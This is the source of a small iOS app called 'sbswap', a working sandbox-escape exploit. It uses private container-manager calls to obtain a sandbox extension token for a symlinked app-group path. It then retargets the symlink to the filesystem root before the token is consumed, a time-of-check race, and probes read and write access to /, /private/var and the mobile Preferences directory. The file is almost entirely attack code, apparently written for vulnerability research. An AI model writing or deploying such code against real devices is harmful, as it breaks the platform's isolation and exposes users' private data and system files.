// sbswap — issue an MCM part token for a symlinked container path, retarget the
// symlink to /, then consume. Tests whether the token binds to the path string
// or to the resolved container at issue time.
#import <UIKit/UIKit.h>
#import <Foundation/Foundation.h>
#import <dlfcn.h>
#import <dirent.h>
#import <unistd.h>
#import <errno.h>
#import <sys/stat.h>
#import <fcntl.h>

typedef void *(*fn_create)(void);
typedef void (*fn_set_u64)(void *, uint64_t);
typedef void (*fn_set_obj)(void *, void *);
typedef void *(*fn_get_one)(void *);
typedef char *(*fn_copy_token)(void *);
typedef const char *(*fn_get_path)(void *);
typedef void (*fn_free)(void *);
typedef int64_t (*fn_consume)(const char *);
typedef int64_t (*fn_release)(int64_t);
typedef void *(*fn_xpc_string)(const char *);
typedef void (*fn_xpc_release)(void *);

static fn_create q_create;
static fn_set_u64 q_class, q_part, q_flags;
static fn_set_obj q_group;
static fn_get_one q_get;
static fn_copy_token q_token;
static fn_get_path q_path;
static fn_free q_free;
static fn_consume s_consume;
static fn_release s_release;
static fn_xpc_string xpc_string;
static fn_xpc_release xpc_release_fn;
static NSString *gGroup;

static void L(NSString *fmt, ...) {
    va_list ap; va_start(ap, fmt);
    NSString *s = [[NSString alloc] initWithFormat:fmt arguments:ap];
    va_end(ap);
    NSLog(@"[sbswap] %@", s);
}

static BOOL loadMCM(void) {
    void *h = dlopen("/usr/lib/system/libsystem_containermanager.dylib", RTLD_NOW | RTLD_LOCAL);
    if (!h) { L(@"dlopen failed %s", dlerror()); return NO; }
    q_create = (fn_create)dlsym(h, "container_query_create");
    q_class = (fn_set_u64)dlsym(h, "container_query_set_class");
    q_group = (fn_set_obj)dlsym(h, "container_query_set_group_identifiers");
    q_part = (fn_set_u64)dlsym(h, "container_query_operation_set_part");
    q_flags = (fn_set_u64)dlsym(h, "container_query_operation_set_flags");
    q_get = (fn_get_one)dlsym(h, "container_query_get_single_result");
    q_token = (fn_copy_token)dlsym(h, "container_copy_sandbox_token");
    q_path = (fn_get_path)dlsym(h, "container_object_get_path");
    q_free = (fn_free)dlsym(h, "container_query_free");
    s_consume = (fn_consume)dlsym(RTLD_DEFAULT, "sandbox_extension_consume");
    s_release = (fn_release)dlsym(RTLD_DEFAULT, "sandbox_extension_release");
    xpc_string = (fn_xpc_string)dlsym(RTLD_DEFAULT, "xpc_string_create");
    xpc_release_fn = (fn_xpc_release)dlsym(RTLD_DEFAULT, "xpc_release");
    L(@"load create=%p get=%p token=%p consume=%p", q_create, q_get, q_token, s_consume);
    return q_create && q_get && q_token && s_consume;
}

static NSString *findGroup(void) {
    NSArray *ids = @[@"group.8e0bc870a21520b9.1", @"group.8e0bc870a21520b9.2",
                     @"group.8e0bc870a21520b9.3", @"group.8e0bc870a21520b9.4",
                     @"group.8e0bc870a21520b9.5"];
    for (NSString *gid in ids) {
        NSURL *u = [[NSFileManager defaultManager] containerURLForSecurityApplicationGroupIdentifier:gid];
        if (u.path.length) return gid;
    }
    return nil;
}

static char *queryToken(uint64_t flags, NSString **pathOut) {
    void *q = q_create();
    q_class(q, 7);
    void *x = xpc_string ? xpc_string(gGroup.UTF8String) : NULL;
    q_group(q, x);
    q_part(q, 3);
    q_flags(q, flags);
    void *res = q_get(q);
    const char *p = (res && q_path) ? q_path(res) : NULL;
    char *tok = (res && q_token) ? q_token(res) : NULL;
    if (pathOut) *pathOut = p ? [NSString stringWithUTF8String:p] : nil;
    L(@"query flags=0x%llx res=%p path=%s token=%s len=%zu", (unsigned long long)flags,
      res, p ? p : "(null)", tok ? "YES" : "NO", tok ? strlen(tok) : 0);
    if (q_free) q_free(q);
    if (x && xpc_release_fn) xpc_release_fn(x);
    return tok;
}

static void tryPath(NSString *p) {
    errno = 0;
    DIR *d = opendir(p.fileSystemRepresentation);
    L(@"opendir %@ -> %p errno=%d", p, d, errno);
    if (d) closedir(d);
}

static void tryWrite(NSString *dir, NSString *name) {
    NSString *m = [dir stringByAppendingPathComponent:name];
    errno = 0;
    int fd = open(m.fileSystemRepresentation, O_CREAT | O_WRONLY | O_TRUNC, 0644);
    L(@"write %@ -> fd=%d errno=%d", m, fd, errno);
    if (fd >= 0) { write(fd, "sbswap", 6); close(fd); unlink(m.fileSystemRepresentation); }
}

static void restoreSymlink(NSString *part, NSString *valid) {
    unlink(part.fileSystemRepresentation);
    symlink(valid.fileSystemRepresentation, part.fileSystemRepresentation);
}

static void runProbe(void) {
    @autoreleasepool {
        L(@"=== sbswap start uid=%d pid=%d", getuid(), getpid());
        if (!loadMCM()) return;
        gGroup = findGroup();
        if (!gGroup) return;
        NSFileManager *fm = [NSFileManager defaultManager];
        NSString *root = [fm containerURLForSecurityApplicationGroupIdentifier:gGroup].path;
        NSString *lib = [root stringByAppendingPathComponent:@"Library"];
        NSString *part = [lib stringByAppendingPathComponent:@"Caches"];
        NSString *valid = @"/private/var/containers/Shared/SystemGroup/systemgroup.com.apple.mobilegestaltcache/Library/Caches";
        [fm createDirectoryAtPath:lib withIntermediateDirectories:YES attributes:nil error:nil];
        [fm removeItemAtPath:part error:nil];
        if (symlink(valid.fileSystemRepresentation, part.fileSystemRepresentation) != 0) {
            L(@"symlink valid failed errno=%d", errno); return;
        }
        L(@"group=%@ part=%@ valid=%@", gGroup, part, valid);
        L(@"control before: prefs read %d", access("/var/mobile/Library/Preferences", R_OK));
        tryPath(@"/var/mobile/Library/Preferences");

        // Phase 1: issue a token while the part path is a symlink to a valid
        // SystemGroup container. Do NOT consume yet.
        NSString *qpath = nil;
        char *tok = queryToken(0x8000000000ULL, &qpath);
        if (!tok) {
            tok = queryToken(0x8100000000ULL, &qpath);
        }
        L(@"issued token=%p qpath=%@", tok, qpath ?: @"(null)");
        if (tok) L(@"tokenstr=%s", tok);

        // Phase 2: retarget the very same path string to the filesystem root
        // before the token is consumed.
        unlink(part.fileSystemRepresentation);
        if (symlink("/", part.fileSystemRepresentation) != 0) {
            L(@"symlink / failed errno=%d", errno);
        }
        L(@"after retarget lstat:");
        struct stat st;
        if (lstat(part.fileSystemRepresentation, &st) == 0) L(@"lstat mode=%o", st.st_mode);

        int64_t h = (tok && s_consume) ? s_consume(tok) : -5;
        L(@"consume=%lld", (long long)h);

        // Phase 3: full-filesystem checks.
        tryPath(@"/");
        tryPath(@"/private/var");
        tryPath(@"/var/mobile/Library/Preferences");
        tryPath(@"/System/Library");
        tryPath(@"/private/var/containers/Shared/SystemGroup/systemgroup.com.apple.mobilegestaltcache/Library/Caches");
        tryWrite(@"/var/mobile/Library/Preferences", @"sbswap_marker");
        tryWrite(@"/private/var", @"sbswap_marker");
        tryWrite(@"/", @"sbswap_marker");

        if (tok) free(tok);
        if (h >= 0 && s_release) s_release(h);
        restoreSymlink(part, valid);
        L(@"=== sbswap done ===");
    }
}

@interface AppDelegate : UIResponder <UIApplicationDelegate>
@property (nonatomic, strong) UIWindow *window;
@end
@implementation AppDelegate
- (BOOL)application:(UIApplication *)app didFinishLaunchingWithOptions:(NSDictionary *)opts {
    self.window = [[UIWindow alloc] initWithFrame:[UIScreen mainScreen].bounds];
    UIViewController *vc = [UIViewController new];
    vc.view.backgroundColor = [UIColor systemBackgroundColor];
    UILabel *l = [[UILabel alloc] initWithFrame:vc.view.bounds];
    l.text = @"sbswap"; l.textAlignment = NSTextAlignmentCenter;
    [vc.view addSubview:l];
    self.window.rootViewController = vc;
    [self.window makeKeyAndVisible];
    dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{ runProbe(); });
    return YES;
}
@end
int main(int argc, char **argv) { @autoreleasepool { return UIApplicationMain(argc, argv, nil, NSStringFromClass([AppDelegate class])); } }
